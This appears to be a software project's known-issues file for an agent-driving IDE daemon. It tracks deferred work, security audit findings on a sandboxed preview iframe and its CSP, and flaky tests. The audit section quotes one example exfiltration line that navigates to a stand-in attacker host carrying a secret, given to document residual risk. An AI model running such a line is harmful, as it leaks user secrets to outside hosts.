# Known Issues

Gaps and deferred work tracked from review passes. Each entry is a one-line
note so the next agent can pick it up without re-reading the full review file.

## Agent-owned history migration — explicitly deferred

Deferred by Product on 2026-07-18. Local `conversations.json` metadata and
SQLite event transcripts remain the fallback/archive while agent-owned history
is designed for capable harnesses. Revisit only after S-HIST-BROWSE and
S-HIST-OPEN establish that path; do not partially rewrite stored history.

## Image upload — Claude Code inline-image delivery gap

The image upload flow (Mode B) is implemented per ACP spec: when an agent
advertises `PromptCapabilities.Image`, the transport sends an inline
`ImageBlock` (base64) with a `Uri` hint; otherwise it sends a
`ResourceLinkBlock` + text instruction telling the agent to read the file.

Claude Code CLI (as of 2.1.128) has a documented parity gap: it does not
reliably deliver inline base64 images to the model even when an `ImageBlock` is
passed in the stdin frame. The resource-link + "please read this file" fallback
path is therefore the robust one for Claude Code today — the agent reads the
file from disk via its own `read` tool (which is the path Claude Code actually
supports, however imperfectly). We mitigate the known `read`-tool bugs (mime
detection by extension, no validation) by validating magic bytes and writing
the correct extension ourselves before storing the upload.

When Claude Code fixes the inline-image gap upstream, no change is needed on
our side — the capability gate will already send the inline `ImageBlock` to any
agent that advertises image support.

## MCP-over-ACP (P4.10) — blocked on SDK `mcp/message` codegen

Investigated 2026-07-13. Deferred; the working inline MCP transport (client
passes stdio/http/sse configs to the agent) is retained.

`coder/acp-go-sdk` v0.13.5 (latest) code-generates `mcp/connect`
(`UnstableConnectMcp`) and `mcp/disconnect` (`UnstableDisconnectMcp`) but **not**
`mcp/message` — the bidirectional relay that carries the actual inner MCP
JSON-RPC. `ClientSideConnection.handle` doesn't dispatch inbound `mcp/message`
(returns `MethodNotFound`), there's no method to send `mcp/message` to the agent,
the `_`-prefixed extension escape-hatch doesn't cover it, and the underlying
`*Connection` is unexported. So a functional broker isn't possible without
forking the SDK or replacing our `ClientSideConnection` usage with a hand-rolled
`acp.NewConnection` layer — both disproportionate for an unstable protocol no
mainstream agent advertises (`mcp_capabilities.acp`) yet.

Fix path / unblock signal + full drop-in design: `docs/plans/acp-spec-compliance.md` § 4.10.

## ACP auth persistence across daemon restarts — deferred

The ACP `authenticate` handshake is re-run on every daemon restart, so users
re-authenticate to each agent after a restart. No persistable auth state
(tokens/cookies) is exposed by the SDK today.

**Severity:** Medium — user-facing annoyance on every restart, no security
risk (auth still required each time).

**Fix path / unblock signal:** One of (a) an ACP SDK change exposing
persistable auth state (tokens/cookies in `AuthenticateResponse`), (b) a
Mistral Vibe change to persist auth locally and skip the ACP authenticate
handshake when valid, or (c) a daemon-side approach that keeps auth alive
across restarts (not possible while tokens are opaque). Track upstream SDK
releases for (a).

## Daemon port-orphan recovery — non-Linux PID-from-port deferred

Linux is wired (`src/app/port.rs` parses `/proc/net/tcp`); macOS/Windows
`find_pid_listening_on` return `Ok(None)` (no cheap kernel introspection path
is wired yet). On those platforms an orphaned daemon without a PID file still
requires a manual `kill`/`taskkill`. See
`docs/plans/other_tasks/active-daemon-port-orphan-recovery-small-high.md`.

## Security audit — deferred findings (from 2026-07-07 audit)

- **sec-auth-credentials-in-query-params (Low):** Device credentials are passed
  as `deviceId`/`secret` query params on WebSocket/SSE handshakes (browsers
  can't set headers on WS). Acceptable trade-off for direct LAN+TLS, but a
  short-lived single-use WS ticket exchanged via the authenticated REST API
  would eliminate the leakage vector if a reverse proxy is ever placed in
  front. Same pattern on `/raw` and `/preview` iframe URLs; preview responses
  send `Referrer-Policy: no-referrer` to limit Referer leakage.

- **sec-preview-same-origin-scripts (Medium — mitigated 2026-07-18, CSP
  reconciled 2026-07-26, exfil closed 2026-07-26):** Browse preview iframe uses
  `sandbox="allow-scripts"` (no `allow-same-origin`) so workspace JS runs with
  an opaque origin and cannot read IDE `localStorage`/cookies or call
  authenticated `/api/*` as the IDE. `/preview` responses set a comprehensive
  CSP: `frame-ancestors 'self'; sandbox allow-scripts; default-src 'none';
  script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src
  'self' data: blob:; font-src 'self' data:; media-src 'self' blob:;
  connect-src 'none'; frame-src 'none'; object-src 'none'; form-action 'none';
  base-uri 'none'`. `default-src 'none'` + per-type `'self'` allows closes the
  third-party exfiltration residual: workspace JS can no longer
  `fetch()`/`sendBeacon()`/WebSocket outbound, nor load cross-origin
  `<img>`/`<script>`/`<link>`/`<video>`/`<iframe>`/`<object>`/`<font>` resources
  that could smuggle data in URL query strings. `'self'` matches the response
  URL's origin (CSP3 §2.2.2), not the sandboxed opaque origin, so relative
  subresources from `/preview/{id}/` still load. `/raw` (direct-access only, no
  frontend iframe) keeps the stricter `sandbox allow-same-origin` (no
  `allow-scripts`) so agent-written HTML opened via `/raw` cannot execute
  scripts at all. Relative assets resolve correctly on loopback, where auth is
  bypassed, but a LAN browser does not propagate the entry URL's query
  credentials to relative subresource requests; preview now uses a 30-minute
  workspace-scoped in-memory ticket exchanged for an HttpOnly, path-scoped
  cookie. The residual risk is exposure of that short-lived ticket in the entry
  URL/server logs; `Referrer-Policy: no-referrer` limits onward Referer leakage.
  The only remaining exfil channel is iframe self-navigation
  (`window.location = 'https://evil.com/?secret'`), which is GET-only,
  URL-length-limited, and visually visible to the user; CSP cannot block
  self-navigation of a sandboxed iframe.

## Git init contract test — deferred (harness limitation)

`POST /api/workspaces/{id}/git/init` (S-GIT-INIT) has no black-box contract
test. The contract harness (`tests/contract_runner/harness.rs`) registers the
shared checked-in seed workspace (`tests/contract/fixtures/seed-workspace`)
in-place — no per-test copy. A `git init` POST would create a `.git/` directory
inside that checked-in fixture, corrupting it for the parallel
`workspaces_git_ok` / `workspaces_git_status_not_a_repo` /
`workspaces_git_diff_not_a_repo` cases that depend on `repoDetected: false`.

The endpoint is covered by unit tests in `src/git/mod.rs`
(`init_refuses_existing_repo`, `init_creates_repo_in_plain_dir`). A contract
test requires either per-test workspace isolation in the harness or a
dedicated mutating-test mode; both are out of scope for S-GIT-INIT.

## `config::tests::save_refuses_temp_data_dir_when_state_dir_is_not_temp` — pre-existing flake

Observed failing during an unrelated `web/src/lib/errors.ts` change on
2026-07-27. Panics at `src/config/tests.rs:131` with `marker must survive: Os {
code: 2, kind: NotFound, message: "No such file or directory" }` — a temp-dir
marker-file assertion, unrelated to the frontend error helpers. Likely a
filesystem/temp-dir cleanup race. Not caused by the errors.ts change (pure
TypeScript); re-investigate independently.

## `EditorPane.tsx` TS2552 `cursorPos` — pre-existing in WIP review tree

Observed failing `npm run build` (`tsc -b`) during an unrelated
`web/src/components/ui/dialog.tsx` change on 2026-07-27.
`src/components/EditorPane.tsx:630:22` errors `TS2552: Cannot find name
'cursorPos'`. Verified pre-existing by reverting the dialog.tsx change to HEAD
and rebuilding — the error persists. The `EditorPane.tsx` file is modified in
the working tree by other in-progress review work (not the dialog fix). Not
caused by the dialog change; fix belongs to the EditorPane review pass.

## `api::embed::tests::spa_entry_serves_embedded_index` — pre-existing build-ordering flake

Observed failing during an unrelated `EditorPane.tsx` change on 2026-07-27.
Panics at `src/api/embed.rs:84` with `build.rs requires web/dist/index.html;
expected embedded SPA, not fallback` (HTTP 503 vs 200). The test expects the
SPA HTML to be embedded at compile time via `build.rs`; when `web/dist` is
stale or absent at `cargo test` time it serves the fallback instead. Pure
build-ordering issue, not caused by the frontend-only EditorPane change.
